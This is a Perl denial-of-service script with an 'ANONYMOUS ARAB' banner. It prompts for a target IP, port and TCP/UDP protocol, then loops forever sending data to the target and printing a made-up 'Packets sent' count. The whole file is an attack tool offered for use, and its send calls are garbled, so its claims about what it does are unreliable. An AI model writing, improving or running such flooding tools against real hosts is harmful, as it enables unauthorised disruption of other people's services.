#!/usr/bin/perl
# Simple denial of service attack In Perl Using Socket Module :)
use IO::Socket;
use Scalar::Util qw(looks_like_number);
use Net::Ping;

system("clear || cls");
#Script Banner================================================================
print q{
                   .-"      "-.
                  /            \
                 |    JOKER11   |
                 |,  .-.  .-.  ,|
                 | )(__/  \__)( |
                 |/     /\     \|
       (@_       (_     ^^     _)
  _     ) \_______\__|IIIIII|__/__________________________
 (_)@8@8{}<________|-\IIIIII/-|_A_N_O_N_Y_M_O_U_S_A_R_A_B_>
        )_/        \          /
       (@           `--------` Welcome!

 [---]   by:> OSEID ALDARY   [---]
 [---]   Version:> 1.5	     [---]
};
# INPUT TARGET INFO ==============================================
print "\n===============================";
print "\n[~] Enter TargetIP: "; # Set Target IP
$host = <STDIN>;
chomp ($host);
while ($host eq ""){
 print "   [!] Enter TargetIP?: ";
 $host = <STDIN>;
 chomp ($host);
}
print "TRAGET ==> $host";
print "\n===============================";
print "\n[~] Enter Port: "; # Set Port
$port = <STDIN>;
chomp ($port);
while ($port eq "" || !looks_like_number($port) || !grep{$port eq $_}(0..65535)){ 
 print "   [!] Enter PORT?: ";       
 $port = <STDIN>;
 chomp ($port); 
} 
print "PORT ==> $port";
print "\n===============================";
print "\n[~] Enter Protockol (TCP or UDP) :"; # Set Protockol;
$proto = <STDIN>;
chomp ($proto);
while ($proto eq "" || !grep{$proto eq $_} 'TCP','UDP','tcp','udp'){
 print "   [!] Enter Protockol (TCP or UDP) ?: ";
 $proto = <STDIN>;
 chomp ($proto);
}
print "Protocol ==> $proto";
print "\n===============================\n";
sleep(2);
# Check Intenret Connection !
my $check = Net::Ping->new("icmp");
if (!($check->ping("www.google.com"))){
	print "\n[!] Error: Please Check Your Internet Connection !!!";
	exit(1);
}
{
$sock = IO::Socket::INET->new (
        PeerAddr => $host,
        PeerPort => $port,
        Proto => "$proto" ) || die "\n[!] Error: Connection Failed To Target[ $host ] !!!\n[!] Please Check Your TargetIP !";
}
system("clear || cls");
print "\n[*] Attack Has Been Start On [$host:$port] proto => [$proto].......\n\n";
sleep(3);


while (1) {
  $size = rand() * 8921873 * 99919988;
  print ("Flooding: (=>$host:$port~$proto<=) Packets sent: $size\n");
  send($sock, $size*2, $size*2); 
  send($sock, $size*3, $size*3);
  send($sock, $size*4, $size*4);
  send($sock, $size*999999999,$size*999999999)
}
##############################################################
#####################                #########################
#####################  END OF SCRIPT #########################
#####################                #########################
##############################################################
#This Script by Oseid Aldary
#Have a nice day :)
#GoodBye
